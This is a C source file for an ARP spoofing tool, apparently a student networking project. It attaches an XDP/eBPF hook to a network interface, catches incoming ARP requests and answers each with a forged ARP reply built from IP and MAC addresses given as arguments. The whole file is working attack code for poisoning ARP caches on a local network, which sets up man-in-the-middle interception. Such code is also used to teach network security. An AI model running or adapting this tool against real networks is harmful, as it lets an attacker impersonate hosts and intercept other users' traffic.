#include "arp.h"
#include <bpf/libbpf.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>

t_cleanup *g_cleanup;

void load_hook(int *map_fd)
{
	struct bpf_program *prog;
	struct bpf_map *map;
	g_cleanup->obj = bpf_object__open("xdp_prog.o");
	if (!g_cleanup->obj)
	{
		perror("bpf_object__open");
		exit (1);
	}
	if (bpf_object__load(g_cleanup->obj))
	{
		bpf_object__close(g_cleanup->obj);
		perror("bpf_object__load");
		exit(1);
	}
	prog = bpf_object__find_program_by_name(g_cleanup->obj, "xdp_prog");
	if (!prog)
	{
		bpf_object__close(g_cleanup->obj);
		perror("bpf_object__find_program_by_name");
		exit(1);
	}
	g_cleanup->link = bpf_program__attach_xdp(prog, if_nametoindex(g_cleanup->ifname));
	if (!g_cleanup->link)
	{
		bpf_object__close(g_cleanup->obj);
		perror("bpf_program__attach_xdp");
		exit(1);
	}
	map = bpf_object__find_map_by_name(g_cleanup->obj, "rb");
	if (!map)
	{
		bpf_object__close(g_cleanup->obj);
		perror("bpf_program__attach_xdp");
		bpf_link__destroy(g_cleanup->link);
		exit(1);
	}
	*map_fd = bpf_map__fd(map);
}

int	callback(void *ctx, void *data, size_t size)
{
	struct sockaddr_ll addr;
	t_frame *frame = (t_frame *)ctx;
	t_ARP *request = (t_ARP *)data;

	(void)size;
	printf("hook request arp\n");
	memcpy(frame->header.dst, request->sha, 6);
	memcpy(frame->pkg_arp.tha, request->sha, 6);

	int ret = socket(AF_PACKET, SOCK_RAW, frame->header.proto);
	if (ret < 0)
		helper();
	memset(&addr, 0, sizeof(addr));
	addr.sll_family = AF_PACKET;
	addr.sll_protocol = frame->header.proto;
	addr.sll_ifindex = if_nametoindex(g_cleanup->ifname);
	printf("envoi reply\n");
	int res = sendto(ret, frame, sizeof(t_frame), 0, (struct sockaddr*)&addr, sizeof(struct sockaddr_ll));
	close(ret);
	if (res < 0)
	{
		perror("socket");
		helper();
	}
	return (1);
}

void	sigint_handler(int sig)
{
	(void)sig;
	if (g_cleanup->obj)
		bpf_object__close(g_cleanup->obj);
	if (g_cleanup->link)
		bpf_link__destroy(g_cleanup->link);
	if (g_cleanup->rb)
		ring_buffer__free(g_cleanup->rb);
	exit(0);
}

int main(int argc, char **argv)
{
	int map_fd;
	t_frame	frame;
	struct	sigaction sa;
	t_cleanup cleanup = {NULL, NULL};

	g_cleanup = &cleanup;
	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = sigint_handler;
	sigaction(SIGINT, &sa, NULL);
	check_root();
	if (argc != 5)
		helper();
	memset(&frame, 0, sizeof(frame));
	get_ifname();
	get_ipv4(argv[1], &frame, true);
	get_ipv4(argv[3], &frame, false);
	get_mac(argv[2], &frame, true);
	get_mac(argv[4], &frame, false);
	frame.header.proto = htons(0x0806);
	frame.pkg_arp.hlen = 6;
	frame.pkg_arp.htype = htons(1);
	frame.pkg_arp.oper = htons(2);
	frame.pkg_arp.plen = 4;
	frame.pkg_arp.ptype = htons(0x0800);
	load_hook(&map_fd);
	g_cleanup->rb = ring_buffer__new(map_fd, callback, &frame, NULL);
	if (!g_cleanup->rb)
	{
		bpf_link__destroy(g_cleanup->link);
		helper();
	}
	while (ring_buffer__poll(g_cleanup->rb, -1) == 0);
	bpf_object__close(g_cleanup->obj);
	bpf_link__destroy(g_cleanup->link);
	ring_buffer__free(g_cleanup->rb);
	return (0);
}
